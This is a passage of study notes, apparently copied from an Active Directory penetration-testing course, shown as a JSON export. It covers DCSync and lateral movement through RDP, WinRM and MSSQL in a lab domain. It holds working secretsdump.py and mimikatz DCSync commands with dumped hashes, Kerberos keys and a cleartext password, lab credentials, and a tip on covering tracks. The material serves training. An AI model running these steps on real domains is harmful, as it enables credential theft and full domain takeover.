a006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)\" |select -ExpandProperty DiscretionaryAcl\n\nEveryone: AccessDenied (WriteData)\nEveryone: AccessAllowed (WriteExtendedAttributes)\nNT AUTHORITY\\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, Traverse, WriteExtendedAttributes)\nNT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)\nNT AUTHORITY\\Authenticated Users: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)\nNT AUTHORITY\\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)\nBUILTIN\\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteAttributes, WriteExtendedAttributes)\nBUILTIN\\Pre-Windows 2000 Compatible Access: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, WriteExtendedAttributes)\nINLANEFREIGHT\\Domain Admins: AccessAllowed (ChangePermissions, CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteAttributes, WriteExtendedAttributes)\nINLANEFREIGHT\\Enterprise Admins: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)\nINLANEFREIGHT\\Organization Management: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)\nINLANEFREIGHT\\Exchange Trusted Subsystem: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)\nINLANEFREIGHT\\mrb3n: AccessAllowed (CreateDirectories, GenericExecute, GenericWrite, ReadExtendedAttributes, ReadPermissions, Traverse, WriteExtendedAttributes)\n```\n\nThere are many tools out there that can be used to help monitor AD. These tools, when used in conjunction with a highly mature AD secure posture, and combined with built-in tools such as the various ways we can monitor for and alert on events in Active Directory, can help to detect these types of attacks and prevent them from going any further.\n\nIn the next section, we'll walk through the DCSync attack, which is the result of the attack path we just worked through and is a common way to achieve domain compromise.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/23- DCSync",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/23- DCSync.md",
    "title": "23  DCSync",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Based on our work in the previous section, we now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through exa...",
    "category": "02_CPTS",
    "content": "\n---\n\nBased on our work in the previous section, we now have control over the user `adunn` who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.\n\n---\n\n## Scenario Setup\n\nIn this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host with the credentials `htb-student:Academy_student_AD!`. For the portion of this section that requires interaction from a Linux host (secretsdump.py) you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`. This could also likely be done all from Windows using a version of `secretsdump.exe` compiled for Windows as there are several GitHub repos of the Impacket toolkit compiled for Windows, or you can do that as a side challenge.\n\n---\n\n## What is DCSync and How Does it Work?\n\nDCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.\n\nThe crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.\n\nTo perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.\n\n#### Viewing adunn's Replication Privileges through ADSI Edit\n\n![ADSI Edit window showing DC=INLANEFREIGHT,DC=LOCAL properties with user Angela Dunn selected, displaying permissions for directory changes.](https://academy.hackthebox.com/storage/modules/143/adnunn_right_dcsync.png)\n\nIt is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords. Here we have a standard domain user that has been granted the replicating permissions:\n\n#### Using Get-DomainUser to View adunn's Group Membership\n\nDCSync\n\n```powershell-session\nPS C:\\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl\n\n\nsamaccountname     : adunn\nobjectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164\nmemberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar\n                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security\n                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security\n                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}\nuseraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\n```\n\nPowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. We first get the user's SID in the above command and then check all ACLs set on the domain object (`\"DC=inlanefreight,DC=local\"`) using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user `adunn` (denoted in the below command as `$sid`) possesses these rights. The command confirms that the user does indeed have the rights.\n\n#### Using Get-ObjectAcl to Check adunn's Replication Rights\n\nDCSync\n\n```powershell-session\nPS C:\\htb> $sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\"\nPS C:\\htb> Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498\nObjectAceType         : DS-Replication-Get-Changes\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516\nObjectAceType         : DS-Replication-Get-Changes-All\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164\nObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164\nObjectAceType         : DS-Replication-Get-Changes\n\nAceQualifier          : AccessAllowed\nObjectDN              : DC=INLANEFREIGHT,DC=LOCAL\nActiveDirectoryRights : ExtendedRight\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164\nObjectAceType         : DS-Replication-Get-Changes-All\n```\n\nIf we had certain rights over the user (such as [WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.\n\nRunning the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.\n\n#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py\n\nDCSync\n\n```shell-session\ndrxh3kr@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 \n\nImpacket v0.9.23 - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5\n[*] Searching for NTDS.dit\n[*] Registry says NTDS.dit is at C:\\Windows\\NTDS\\ntds.dit. Calling vssadmin to get a copy. This might take some time\n[*] Using smbexec method for remote execution\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6\n[*] Reading and decrypting hashes from \\\\172.16.5.5\\ADMIN$\\Temp\\HOLJALFD.tmp \ninlanefreight.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\nguest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nlab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::\nACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::\nACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::\nACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::\ninlanefreight.local\\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::\ninlanefreight.local\\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::\n\n<SNIP>\n\nd0wngrade:des-cbc-md5:d6fee0b62aa410fe\nd0wngrade:dec-cbc-crc:d6fee0b62aa410fe\nACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d\nsvc_qualys:des-cbc-md5:f125ab34b53eb61c\nforend:des-cbc-md5:e3c14adf9d8a04c1\n[*] ClearText password from \\\\172.16.5.5\\ADMIN$\\Temp\\HOLJALFD.tmp \nproxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!\n[*] Cleaning up...\n```\n\nWe can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:\n\n- Number and % of passwords cracked\n- top 10 passwords\n- Password length metrics\n- Password re-use\n\nreflect only active user accounts in the domain.\n\nIf we check the files created using the `-just-dc` flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.\n\n#### Listing Hashes, Kerberos Keys, and Cleartext Passwords\n\nDCSync\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls inlanefreight_hashes*\n\ninlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos\n```\n\nWhile rare, we see accounts with these settings from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.\n\n#### Viewing an Account with Reversible Encryption Password Storage Set\n\n![Active Directory Users and Computers showing PROXYAGENT properties with account options and expiration settings.](https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)\n\nWhen this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:\n\n#### Enumerating Further using Get-ADUser\n\nDCSync\n\n```powershell-session\nPS C:\\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl\n\nDistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\nEnabled            : True\nGivenName          :\nName               : PROXYAGENT\nObjectClass        : user\nObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334\nSamAccountName     : proxyagent\nSID                : S-1-5-21-3842939050-3880317879-2865463114-5222\nSurname            :\nuserAccountControl : 640\nUserPrincipalName  :\n```\n\nWe can see that one account, `proxyagent`, has the reversible encryption option set with PowerView as well:\n\n#### Checking for Reversible Encryption Option using Get-DomainUser\n\nDCSync\n\n```powershell-session\nPS C:\\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol\n\nsamaccountname                         useraccountcontrol\n--------------                         ------------------\nproxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT\n```\n\nWe will notice the tool decrypted the password and provided us with the cleartext value.\n\n#### Displaying the Decrypted Password\n\nDCSync\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext \n\nproxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!\n```\n\nI have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.\n\nWe can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.\n\nAlso it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:\n\n#### Using runas.exe\n\nDCSync\n\n```cmd-session\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>runas /netonly /user:INLANEFREIGHT\\adunn powershell\nEnter the password for INLANEFREIGHT\\adunn:\nAttempting to start powershell as user \"INLANEFREIGHT\\adunn\" ...\n```\n\nFrom the newly spawned powershell session, we can perform the attack:\n\n#### Performing the Attack with Mimikatz\n\nDCSync\n\n```powershell-session\nPS C:\\htb> .\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator\n[DC] 'INLANEFREIGHT.LOCAL' will be the domain\n[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server\n[DC] 'INLANEFREIGHT\\administrator' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : Administrator\n\n** SAM ACCOUNT **\n\nSAM Username         : administrator\nUser Principal Name  : administrator@inlanefreight.local\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )\nAccount expiration   :\nPassword last change : 10/27/2021 6:49:32 AM\nObject Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500\nObject Relative ID   : 500\n\nCredentials:\n  Hash NTLM: 88ad09182de639ccc6579eb0849751cf\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : 4625fd0c31368ff4c255a3b876eaac3d\n\n<SNIP>\n```\n\n---\n\n## Moving On\n\nIn the next section, we'll see some ways to enumerate and take advantage of remote access rights that may be granted to a user we control. These methods include Remote Desktop Protocol (RDP), WinRM (or PsRemoting), and SQL Server admin access.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/24-Privileged Access",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/24-Privileged Access.md",
    "title": "24 Privileged Access",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nOnce we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.\n\n`But what if we don't yet have local admin rights on any hosts in the domain?`\n\nThere are several other ways we can move around a Windows domain:\n\n- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host\n    \n- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell\n    \n- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods\n    \n\nWe can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:\n\n- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)\n- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)\n- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)\n\nWe can also enumerate these privileges using tools such as PowerView and even built-in tools.\n\n---\n\n## Scenario Setup\n\nIn this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host (`mssqlclient.py` and `evil-winrm`) you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`. We recommend that you try all methods shown in this section (i.e., `Enter-PSSession` and `PowerUpSQL` from the Windows attack host and `evil-winrm` and `mssqlclient.py` from the Linux attack host).\n\n---\n\n## Remote Desktop\n\nTypically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:\n\n- Launch further attacks\n- We may be able to escalate privileges and obtain credentials for a higher privileged user\n- We may be able to pillage the host for sensitive data or credentials\n\nUsing PowerView, we could use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on a given host. Let's check out the `Remote Desktop Users` group on the `MS01` host in our target domain.\n\n#### Enumerating the Remote Desktop Users Group\n\nPrivileged Access\n\n```powershell-session\nPS C:\\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"\n\nComputerName : ACADEMY-EA-MS01\nGroupName    : Remote Desktop Users\nMemberName   : INLANEFREIGHT\\Domain Users\nSID          : S-1-5-21-3842939050-3880317879-2865463114-513\nIsGroup      : True\nIsDomain     : UNKNOWN\n```\n\nFrom the information above, we can see that all Domain Users (meaning `all` users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts. This type of server could be heavily used, and we could potentially find sensitive data (such as credentials) that could be used to further our access, or we may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain. Typically the first thing I check after importing BloodHound data is:\n\nDoes the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?\n\n#### Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound\n\n![Graph showing DOMAIN USERS@INLANEFREIGHT.LOCAL with local admin and execution rights, connected to ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL via CanRDP.](https://academy.hackthebox.com/storage/modules/143/bh_RDP_domain_users.png)\n\nIf we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.\n\n#### Checking Remote Access Rights using BloodHound\n\n![Node info for WLEY@INLANEFREIGHT.LOCAL showing execution rights, including Group Delegated RDP Privileges set to 1.](https://academy.hackthebox.com/storage/modules/143/execution_rights.png)\n\nWe could also check the `Analysis` tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`. There are other ways to enumerate this information, but BloodHound is a powerful tool that can help us narrow down these types of access rights quickly and accurately, which is hugely beneficial to us as penetration testers under time constraints for the assessment period. This can also be helpful for the blue team to periodically audit remote access rights across the environment and catch large-scale issues such as all Domain Users having unintended access to a host or audit rights for specific users/groups.\n\nTo test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe` if attacking from a Windows host.\n\n---\n\n## WinRM\n\nLike RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function `Get-NetLocalGroupMember` to the `Remote Management Users` group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.\n\n#### Enumerating the Remote Management Users Group\n\nPrivileged Access\n\n```powershell-session\nPS C:\\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"\n\nComputerName : 